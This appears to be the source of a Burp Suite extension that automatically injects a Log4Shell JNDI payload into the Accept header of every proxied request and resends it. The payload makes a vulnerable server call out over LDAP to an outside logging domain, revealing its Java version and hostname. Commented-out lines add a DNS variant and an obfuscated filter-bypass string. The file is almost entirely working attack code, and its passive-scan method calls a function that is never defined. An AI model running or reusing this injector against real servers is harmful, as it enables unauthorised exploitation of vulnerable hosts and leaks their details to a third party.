# /usr/bin/env python
# _*_ coding:utf-8 _*_
# 版本 1.0
__author__ = 'Andey'

from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory
import sys
import time
import os
import re
import requests
from hashlib import md5
import random
import urllib
import json

finish_set = set()

def randmd5():
    new_md5 = md5()
    new_md5.update(str(random.randint(1, 1000)))
    return new_md5.hexdigest()[:6]

def checkIsStatic(uri):
    if ".jpg" in uri[0] or ".png" in uri[0] or ".jpeg" in uri[0] or ".js" in uri[0] or ".css" in uri[0] or ".mp4" in uri[0]:
        return True
    else:
        return False

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        print("[+] #####################################")
        print("[+]     盲打Log4j Via Accept.")
        print("[+]     Author:   Andey")
        print("[+] #####################################\r\n\r\n")
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName('scan_log4j_Via_Accept')
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):

        if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER or toolFlag == self._callbacks.TOOL_SCANNER:
            # 监听Response
            if not messageIsRequest:

                '''请求数据'''
                # 获取请求包的数据
                resquest = messageInfo.getRequest()
                analyzedRequest = self._helpers.analyzeRequest(resquest)
                request_header = analyzedRequest.getHeaders()
                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()

                # 请求方法
                reqMethod = analyzedRequest.getMethod()

                '''响应数据'''
                # 获取响应包数据
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(response)  # returns IResponseInfo
                response_headers = analyzedResponse.getHeaders()
                request_host, request_Path = self.get_request_host(request_header)
                response_bodys = response[analyzedResponse.getBodyOffset():].tostring()
                response_statusCode = analyzedResponse.getStatusCode()
                expression = r'.*(application/json).*'
                for rpheader in response_headers:
                    if (rpheader.startswith("Content-Type:") or rpheader.startswith("content-type:")) and re.match(expression, rpheader):
                        response_is_json = True

                # 获取服务信息
                httpService = messageInfo.getHttpService()
                port = httpService.getPort()
                host = httpService.getHost()

                uri = request_Path.split("?")

                if len(uri) > 1:
                    request_uri = uri[1]
                else :
                    request_uri = uri[0]

                payload_dnslog = 'Accept.hack.i.log4shell.org'
                randomStr = randmd5()
                # vuln_domain = str(randomStr) +"."+ str(host) + '.' + payload_dnslog
                vuln_domain = str(host) + '.' + payload_dnslog
                # payload = '${jndi:dns://${sys:java.version}.${hostName}.%s/Expo}' % (vuln_domain)
                payload = '\ud83d\ude04${jndi:ldap://${sys:java.version}.${hostName}.%s}' % (vuln_domain)
                # bypass = '${j${:-}n${:-}d${:-}i:d${:-}n${:-}s://${sys:java.version}.${hostName}.%s/Expo}' % (vuln_domain)

                lists= [payload]
                if (str(host) + str(request_uri)) not in finish_set and not checkIsStatic(uri):
                    request_header = self.set_request_accept(request_header,payload)

                    newBody = self._helpers.stringToBytes(request_bodys)
                    newRequest = self._helpers.buildHttpMessage(request_header, newBody)

                    ishttps = False
                    expression = r'.*(443).*'
                    if re.match(expression, str(port)):
                        ishttps = True
                    rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                    # print(host)
                    # print(request_uri)
                    print("[fuzz] ==>  ", str(host) + str(request_uri) )
                    finish_set.add( str(host) + str(request_uri) )

    # 更改请求的ua头
    def set_request_accept(self, reqHeaders,payload):
        isSet = False
        for _ in range(len(reqHeaders)):
            if "Accept:" in reqHeaders[_]:
                reqHeaders[_] = "Accept: " + payload.strip()
                isSet = True
        if not isSet: # 没有Accept头，就添加一个
            reqHeaders.append("Accept: " + payload.strip())

        return reqHeaders


    # 获取请求的host , uri
    def get_request_host(self, reqHeaders):
        uri = reqHeaders[0].split(' ')[1]
        for _ in reqHeaders:
            if "Host:" in _:
                host_list = _.split(':')

        host = host_list[1].strip()
        return host, uri

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        pass

    def doPassiveScan(self, baseRequestResponse):
        self.issues = []
        self.start_run(baseRequestResponse)
        return self.issues
